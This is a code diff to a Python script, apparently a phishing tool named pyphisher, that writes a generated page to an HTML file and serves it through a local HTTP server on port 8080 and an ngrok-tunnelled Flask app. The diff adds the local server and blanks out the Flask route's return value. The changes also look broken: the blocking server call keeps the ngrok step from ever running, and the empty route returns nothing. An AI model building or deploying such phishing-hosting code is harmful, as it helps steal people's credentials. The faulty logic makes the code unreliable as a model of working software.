@@ -4,9 +4,23 @@ import traceback
 import urllib.request
 import urllib.error
 import urllib.parse
+import http.server
+import socketserver
 from colorama import Fore, Style, Back
 from flask import Flask
 from flask_ngrok import run_with_ngrok
+
+
+
+def run():
+    PORT = 8080
+    Handler = http.server.SimpleHTTPRequestHandler
+
+    with socketserver.TCPServer(("", PORT), Handler) as httpd:
+        print("serving at port", PORT)
+        httpd.serve_forever()
+        return
+
 
 def ngrok():
     app = Flask(__name__)
@@ -14,7 +28,7 @@ def ngrok():
 
     @app.route("/")
     def hello():
-        return open("index.html")
+        return
 
     app.run()
 def pyphisher():
@@ -70,6 +84,7 @@ def pyphisher():
         html_file.write(final_source)
         html_file.close()
         print(Fore.WHITE + "")
+        run()
         ngrok()
 
 
